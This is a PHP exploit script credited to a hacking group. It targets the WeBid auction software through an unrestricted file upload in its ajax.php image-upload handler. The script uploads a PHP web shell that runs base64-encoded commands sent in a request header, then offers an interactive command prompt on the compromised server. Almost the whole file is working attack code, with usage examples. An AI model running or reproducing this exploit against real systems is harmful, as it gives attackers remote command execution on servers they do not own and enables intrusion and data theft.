<?php
   
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
   
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
    
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
   
print "\n+----------------------------------------+";
print "\n| WeBid Unrestricted File Upload Exploit |";
print "\n+----------------------------------------+\n";
    
if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /WeBid/\n";
    die();
}
   
$host = $argv[1];
$path = $argv[2];
    
$payload  = "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"name\"\r\n\r\n";
$payload .= "shell.php\r\n";
$payload .= "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"file\"; 
filename=\"shell.php\"\r\n";
$payload .= "Content-Type: application/octet-stream\r\n\r\n";
$payload .= "<?php error_reporting(0); print(___); 
passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
$payload .= "--o0oOo0o--\r\n";
 
$packet  = "POST {$path}ajax.php?do=uploadaucimages HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
$packet .= "Cookie: PHPSESSID=cwh"."\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
 
print "\n\nExploiting...";
sleep(2);
print "Waiting for shell...\n";
sleep(2);
 
http_send($host, $packet);
   
$packet  = "GET {$path}uploaded/cwh/shell.php HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";
 
   print "\n  ,--^----------,--------,-----,-------^--,   \n";
   print "  | |||||||||   `--------'     |          O   \n";
   print "  `+---------------------------^----------|   \n";
   print "    `\_,-------, _________________________|   \n";
   print "      / XXXXXX /`|     /                      \n";
   print "     / XXXXXX /  `\   /                       \n";
   print "    / XXXXXX /\______(                        \n";
   print "   / XXXXXX /                                 \n";
   print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
   print " (________(                                   \n";
   print "  `------'                                    \n";
       
while(1)
{
    print "\nWebid-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] 
Exploit failed!\n");
}
 
?>
